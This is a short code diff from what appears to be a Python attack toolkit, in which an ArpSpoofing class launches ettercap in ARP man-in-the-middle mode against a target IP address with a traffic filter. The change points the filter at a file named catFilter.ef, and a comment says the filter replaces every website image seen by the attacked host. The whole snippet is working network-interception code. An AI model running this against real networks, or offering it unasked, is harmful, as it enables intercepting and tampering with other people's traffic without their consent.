@@ -44,7 +44,9 @@ class ArpSpoofing(attackBase.Attack):
 	# Replaces all images of websites on the attacked host
 	def ettercapFun(self):
 		self.ifaceData()
-		filter = "/usr/share/ettercap/test.ef"
+		filter = "/usr/share/ettercap/catFilter.ef"		
+		#filter = "/usr/share/ettercap/test.ef"
+		#filter = "/home/Dokumente/test.ef"
 		subprocess.call(["ettercap", "-T", "-q", "-F", filter, "-i", self.interface, "-M", "ARP", "/"+self.ipAddress+"//", "///", "&"])
 	
 	
